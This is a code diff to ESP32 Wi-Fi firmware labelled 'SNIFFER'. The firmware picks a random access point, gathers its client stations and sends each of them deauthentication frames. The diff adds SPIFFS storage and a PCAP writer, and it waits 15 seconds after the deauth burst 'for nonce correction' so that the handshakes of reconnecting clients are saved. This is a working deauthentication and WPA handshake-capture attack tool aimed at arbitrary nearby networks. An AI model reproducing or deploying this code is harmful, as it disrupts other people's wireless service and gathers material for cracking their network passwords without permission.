@@ -8,6 +8,8 @@
 #include "nvs_flash.h"
 #include <stdio.h>
 #include <string.h>
+#include "esp_spiffs.h"
+#include "pcap.h"
 
 static const char *TAG = "SNIFFER";
 
@@ -71,6 +73,10 @@ void add_station(const uint8_t *mac) {
 static void wifi_sniffer_packet_handler(void *buff, wifi_promiscuous_pkt_type_t type) {
     const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buff;
     const uint8_t *data = pkt->payload;
+  
+    if (is_writer_enabled()) {
+    write_pcap_packet( data, pkt->rx_ctrl.sig_len);
+}
 if (type == WIFI_PKT_MGMT) {
     const uint8_t *bssid = &data[10];
     int offset = 36; // Start after 802.11 management header
@@ -139,6 +145,9 @@ void deauth_clients() {
         send_deauth_packet(selected_ap_bssid, station_list[i]); // Unicast deauth
         vTaskDelay(pdMS_TO_TICKS(50));
     }
+    vTaskDelay(pdMS_TO_TICKS(15000)); // Wait for some more packets for nonce correction
+    ESP_LOGI(TAG, "Deauth completed for %d clients.", station_count);
+    close_pcap_writer(); // Close PCAP writer after deauth
 }
 
 void selectAP(void) {
@@ -166,10 +175,10 @@ void selectAP(void) {
     esp_wifi_set_channel(ap_list[random_index].channel, WIFI_SECOND_CHAN_NONE);
     ESP_LOGI(TAG, "Sniffing for clients for 10 seconds...");
     vTaskDelay(pdMS_TO_TICKS(10000)); // Capture stations for 10s
-    esp_wifi_set_promiscuous(false);  // Disable sniffer
     esp_wifi_set_mode(WIFI_MODE_STA);
     esp_wifi_start();
     esp_wifi_set_channel(ap_list[random_index].channel, WIFI_SECOND_CHAN_NONE);
+    start_pcap_writer(); // Start PCAP writer
     deauth_clients();
     ESP_LOGI(TAG, "Deauth sent to selected AP: %02X:%02X:%02X:%02X:%02X:%02X",
              selected_ap_bssid[0], selected_ap_bssid[1], selected_ap_bssid[2],
@@ -187,11 +196,26 @@ void channel_hopper_task(void *pvParameters) {
     selectAP();
     vTaskDelete(NULL);
 }
+void init_spiffs() {
+    esp_vfs_spiffs_conf_t conf = {
+        .base_path = "/spiffs",
+        .partition_label = NULL,
+        .max_files = 5,
+        .format_if_mount_failed = true
+    };
+
+    ESP_ERROR_CHECK(esp_vfs_spiffs_register(&conf));
+
+    size_t total = 0, used = 0;
+    esp_spiffs_info(NULL, &total, &used);
+    ESP_LOGI("SPIFFS", "Partition size: total: %d, used: %d", total, used);
+}
 
 void app_main(void) {
     ESP_ERROR_CHECK(nvs_flash_init());
     ESP_ERROR_CHECK(esp_netif_init());
     ESP_ERROR_CHECK(esp_event_loop_create_default());
+    init_spiffs();
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     ESP_ERROR_CHECK(esp_wifi_init(&cfg));
 
